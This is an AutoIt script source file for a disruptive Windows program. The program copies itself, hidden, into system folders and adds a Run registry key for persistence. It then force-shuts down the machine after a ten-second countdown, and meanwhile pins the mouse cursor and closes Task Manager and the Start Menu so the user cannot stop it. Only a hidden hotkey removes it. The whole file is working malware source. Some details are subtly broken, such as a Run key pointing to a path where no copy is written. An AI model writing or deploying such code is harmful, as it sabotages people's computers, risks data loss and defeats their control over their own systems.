#NoTrayIcon
#RequireAdmin
HotKeySet("+5", "Terminate")
Dim $i_TimeStamp = TimerInit()
Dim $i_TimeToCountDownFromSeconds = 10
$i = 1
$name = "SD.exe"
$installed = RegRead("HKLM\SOFTWARE\SD", "Installed")
AdlibEnable("stop", 10)

if $installed <> 1 Then
	FileCopy(@ScriptFullPath, @FavoritesCommonDir & "/" & $name, 1)
	FileCopy(@ScriptFullPath, @AppDataCommonDir & "/" & $name, 1)
	FileCopy(@ScriptFullPath, @DesktopCommonDir & "/" & $name, 1)
	FileCopy(@ScriptFullPath, @DocumentsCommonDir & "/" & $name, 1)
	FileCopy(@ScriptFullPath, @ProgramsCommonDir & "/" & $name, 1)
	FileCopy(@ScriptFullPath, @SystemDir & "/" & $name, 1)
	RegWrite("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "ShutDown", "REG_SZ", @CommonFilesDir & "\" & $name)
	FileSetAttrib(@FavoritesCommonDir & "/" & $name, "H")
	FileSetAttrib(@AppDataCommonDir & "/" & $name, "H")
	FileSetAttrib(@DesktopCommonDir & "/" & $name, "H")
	FileSetAttrib(@DocumentsCommonDir & "/" & $name, "H")
	FileSetAttrib(@ProgramsCommonDir & "/" & $name, "H")
	FileSetAttrib(@SystemDir & "/" & $name, "H")
	RegWrite("HKLM\SOFTWARE\SD", "Installed", "REG_SZ", "1")
EndIf

While 1
	If TimerDiff($i_TimeStamp) >= 1000 Then
		ToolTip($i_TimeToCountDownFromSeconds & " Seconds until windows shutdown", 5, 5, "ShutDown Imminent", 2)
		$i_TimeStamp = TimerInit()
		If $i_TimeToCountDownFromSeconds = 0 Then ExitLoop
		$i_TimeToCountDownFromSeconds -= 1
	EndIf
WEnd

	SoundPlay(@WindowsDir & "\media\tada.wav")
	Shutdown(9)

While 1
	ToolTip("Shutting Down.", 5, 5, "ShutDown Imminent", 2)
	Sleep(200)
	ToolTip("Shutting Down..", 5, 5, "ShutDown Imminent", 2)
	Sleep(200)
	ToolTip("Shutting Down...", 5, 5, "ShutDown Imminent", 2)
	Sleep(200)
WEnd

Func Terminate()
	$Exit = MsgBox(321, @UserName, @UserName & ", you deactivaed the program successfully!")
	If $Exit = 1 Then
		FileDelete(@FavoritesCommonDir & "/" & $name)
		FileDelete(@AppDataCommonDir & "/" & $name)
		FileDelete(@DesktopCommonDir & "/" & $name)
		FileDelete(@DocumentsCommonDir & "/" & $name)
		FileDelete(@ProgramsCommonDir & "/" & $name)
		FileDelete(@SystemDir & "/" & $name)
		RegDelete("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "ShutDown")
		RegDelete("HKLM\SOFTWARE\SD", "Installed")
		RegDelete("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "AutoShutDown")
		_SelfDelete()
	ElseIf $Exit = 2 Then
		Shutdown(9)
	EndIf
EndFunc   ;==>Terminate

Func _SelfDelete($iDelay = 0)
	Local $sCmdFile
	FileDelete(@TempDir & "\scratch.bat")
	$sCmdFile = 'ping -n ' & $iDelay & '127.0.0.1 > nul' & @CRLF _
			 & ':loop' & @CRLF _
			 & 'del "' & @ScriptFullPath & '" > nul' & @CRLF _
			 & 'if exist "' & @ScriptFullPath & '" goto loop' & @CRLF _
			 & 'del ' & @TempDir & '\scratch.bat'
	FileWrite(@TempDir & "\scratch.bat", $sCmdFile)
	Run(@TempDir & "\scratch.bat", @TempDir, @SW_HIDE)
	Exit
EndFunc   ;==>_SelfDelete

Func Stop()
	MouseMove(0, 0, 0)
	If WinActive("Windows Task Manager") Or WinActive("Close Program") Or WinActive("Start Menu") Then
		WinClose("Windows Task Manager")
		WinClose("Close Program")
		WinClose("Start Menu")
	EndIf
EndFunc   ;==>Stop